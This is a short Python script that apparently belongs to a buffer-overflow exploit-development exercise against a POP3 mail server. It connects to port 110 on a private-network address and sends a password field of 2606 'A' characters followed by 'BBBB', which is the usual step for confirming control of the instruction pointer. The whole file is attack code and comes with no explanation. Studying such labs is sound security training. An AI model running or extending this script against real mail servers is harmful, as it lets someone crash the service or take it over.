#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys
import socket

ip = "192.168.1.38"
port = 110

buffer = "A" * 2606 + "BBBB"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((ip, port))
    sock.recv(1024)
    sock.send(b"USER test\r\n")
    sock.recv(1024)
    sock.send(b"PASS " + buffer.encode() + b"\r\n") 
    sock.close()
except Exception as e:
    print("Could not connect to server: " + str(e))
    sys.exit()
